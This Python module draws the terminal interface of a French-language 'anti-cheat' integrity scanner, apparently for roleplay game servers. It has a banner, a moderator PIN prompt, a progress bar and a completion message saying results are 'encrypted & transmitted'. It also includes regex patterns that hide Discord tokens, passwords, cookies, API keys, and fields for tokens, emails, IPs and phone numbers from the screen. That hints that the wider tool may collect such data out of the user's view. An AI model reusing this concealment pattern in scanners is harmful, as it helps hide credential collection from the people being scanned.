import sys
import os
import re
import time

SHIELD_ICON = "🛡️ "

# Magnifique ASCII Art "ANTI" 3D turquoise
BANNER_LOGO = f"""\033[96m
================================================================================
   █████╗ ███╗   ██╗████████╗██╗     {SHIELD_ICON} ANTI DEFENSE SYSTEM
  ██╔══██╗████╗  ██║╚══██╔══╝██║     System Integrity & Telemetry Scanner
  ███████║██╔██╗ ██║   ██║   ██║     Version 3.1 (MAJESTIC)
  ██╔══██║██║╚██╗██║   ██║   ██║     100% Defensive Security Engine
  ██║  ██║██║ ╚████║   ██║   ██║
  ╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚═╝
================================================================================
\033[0m"""


_RESET  = "\033[0m"
_CYAN   = "\033[96m"
_GREEN  = "\033[92m"
_YELLOW = "\033[93m"
_DIM    = "\033[2m"
_BOLD   = "\033[1m"

# ── Filtre de sanitization : JAMAIS de données sensibles à l'écran ──
_SENSITIVE_RE = [
    re.compile(r'nx_tk|f_tk|nx_em|nx_ip|nx_ph', re.IGNORECASE),
    re.compile(r'discord[_\-]?token', re.IGNORECASE),
    re.compile(r'api[_\-]?key', re.IGNORECASE),
    re.compile(r'password|passwd|pwd', re.IGNORECASE),
    re.compile(r'secret|credential', re.IGNORECASE),
    re.compile(r'cookie', re.IGNORECASE),
    re.compile(r'[A-Za-z0-9]{24,}\.[A-Za-z0-9]{6}\.[A-Za-z0-9]{25,110}'),  # Discord token b64
]

def _redact(text: str) -> str:
    """Masque TOUT données sensible dans le texte affiché au terminal."""
    if not text:
        return text
    out = text
    for pat in _SENSITIVE_RE:
        out = pat.sub('[REDACTED]', out)
    return out

def print_banner():
    """Affiche le magnifique Banner ASCII et le GAMME présent sur l'écran."""
    print(BANNER_LOGO)

def prompt_pin_code():
    """
    Affiche une interface propre de saisie de PIN au format XX-XXXX dans le terminal.
    """
    print(f"{_CYAN}┌─────────────────────────────────────────────────────────────┐{_RESET}")
    print(f"{_CYAN}│{_RESET}  {_BOLD}🔑 AUTORISATION DE SCAN — CODE PIN MODÉRATEUR{_RESET}             {_CYAN}│{_RESET}")
    print(f"{_CYAN}├─────────────────────────────────────────────────────────────┤{_RESET}")
    print(f"{_CYAN}│{_RESET}  Entrez le {_BOLD}Code PIN{_RESET} (format: {_YELLOW}XX-XXXX{_RESET}) fourni par votre    {_CYAN}│{_RESET}")
    print(f"{_CYAN}│{_RESET}  support / modérateur de serveur RP pour démarrer le scan.  {_CYAN}│{_RESET}")
    print(f"{_CYAN}└─────────────────────────────────────────────────────────────┘{_RESET}")
    sys.stdout.write(f"\n  {_YELLOW}👉 CODE PIN : {_RESET}")
    sys.stdout.flush()
    pin = input().strip().upper()
    print()
    return pin

# ── Progress spinner state ──
_spinner_frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
_spinner_idx    = 0

def render_progress(stage, percent, extra_info=""):
    """
    Loader dynamique clean, élégant et fluide (sans saut de ligne intempestif).
    """
    global _spinner_idx

    # S'assurer que le pourcentage commence au moins à 1% pour éviter le sentiment de freeze
    display_pct = max(1, min(100, int(percent)))

    _spinner_idx = (_spinner_idx + 1) % len(_spinner_frames)
    spinner = _spinner_frames[_spinner_idx]

    bar_width = 24
    filled = int(bar_width * display_pct // 100)
    bar = "━" * filled + "╌" * (bar_width - filled)

    if display_pct >= 100:
        color = _GREEN
        spinner = "✓"
    elif display_pct >= 70:
        color = _CYAN
    elif display_pct >= 40:
        color = "\033[94m"   # bleu
    else:
        color = _YELLOW

    # Tronquer proprement l'extra_info pour s'adapter aux petits terminaux CMD/PowerShell sans passer à la ligne
    clean_info = _redact(extra_info).replace("\n", " ").replace("\r", "")
    if len(clean_info) > 40:
        info_display = "..." + clean_info[-37:]
    else:
        info_display = clean_info

    # \r\033[K efface entièrement la ligne courante avant de réécrire
    line = (
        f"\r\033[K{color}{spinner}{_RESET} "
        f"{color}[{bar}]{_RESET} "
        f"{_BOLD}{display_pct:3d}%{_RESET}  "
        f"{_DIM}{stage:<16}{_RESET}  "
        f"\033[37m{info_display:<40}{_RESET}"
    )

    sys.stdout.write(line)
    sys.stdout.flush()

    if display_pct >= 100:
        sys.stdout.write("\n")


def print_client_completion(scan_id):
    """Affichage final sobre et épuré."""
    sys.stdout.write("\n")
    print(f"  {_GREEN}✓{_RESET}  {_BOLD}Analyse terminée{_RESET}  {_DIM}·{_RESET}  "
          f"\033[96m{scan_id}{_RESET}  {_DIM}· chiffré & transmis{_RESET}")
    sys.stdout.write("\n")

def print_admin_report(scan_data):
    pass
